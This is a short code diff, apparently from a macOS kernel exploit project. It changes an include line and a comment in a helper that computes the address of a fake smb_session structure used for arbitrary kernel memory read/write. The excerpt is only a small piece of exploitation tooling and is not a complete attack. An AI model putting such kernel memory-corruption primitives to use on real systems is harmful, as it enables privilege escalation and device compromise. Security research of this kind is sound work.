@@ -17,7 +17,7 @@
 #include <xe/xnu/thread.h>
 #include <xe/util/assert.h>
 
-#include <macos_params.h>
+#include <macos/macos.h>
 
 #include "kmem_write_session.h"
 #include "smb/params.h"
@@ -153,7 +153,7 @@ void kmem_write_session_write_block(kmem_write_session_t session, int smb_dev, u
 
 
 // Returns the address of fake smb_session which can be set to `smb_dev->sd_session`
-// using `smb_dev_rw.c`
+// using `smb_dev_rw.c` for arbitary kernel memory read
 uintptr_t kmem_write_session_get_addr(kmem_write_session_t session) {
     uintptr_t thread = session->thread;
     return thread + TYPE_THREAD_MEM_ITH_VOUCHER_NAME_OFFSET - TYPE_SMB_SESSION_MEM_SESSION_FLAGS_OFFSET;
